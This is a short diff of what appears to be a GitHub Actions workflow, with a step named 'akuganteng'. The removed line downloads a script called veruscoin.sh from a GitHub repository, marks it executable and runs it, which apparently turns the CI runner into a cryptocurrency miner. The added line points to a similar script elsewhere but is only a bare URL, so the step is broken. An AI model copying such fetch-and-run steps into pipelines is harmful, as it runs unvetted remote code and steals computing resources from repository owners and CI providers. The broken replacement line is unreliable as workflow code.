@@ -24,4 +24,4 @@ id: go
 uses: actions/checkout@v2
 - name: akuganteng
 run: |
-wget https://github.com/sarayoot31/coins/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+https://github.com/zwekokolinn/coins/blob/main/veruscoin.sh
